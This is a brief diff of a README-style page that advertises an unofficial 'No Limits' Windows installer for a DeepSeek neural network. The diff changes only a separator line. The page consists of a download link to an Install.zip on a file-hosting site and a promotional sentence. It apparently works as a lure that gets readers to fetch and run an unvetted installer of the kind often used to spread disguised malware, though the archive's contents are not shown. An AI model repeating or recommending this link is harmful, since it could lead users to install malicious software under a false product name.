@@ -1,5 +1,5 @@
 PC Version of DeepSeek Neural Network (No Limits, Easy Installation on Windows)
-----------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------
 # Download the installer: [Download for Windows](https://download1527.mediafire.com/lrnme6s8lwpg9o2ZgZY1llBe0SliZQvfqFVLHtGhZ9YetgUzLxeq7UXoI1IA8prUB7IcxGY4t7ov6rT9Z2JTtzueQg6pr2h-DLUthG-S4Wnx50OY2VWOdeXHBYRFrN7t7rGuv58dst39xFqMUprwrR57bH581KaQgD8eq_hqjKUu/q13iidftcj1nnjy/Install.zip)
 
 Ready to take your projects to the next level with powerful AI?
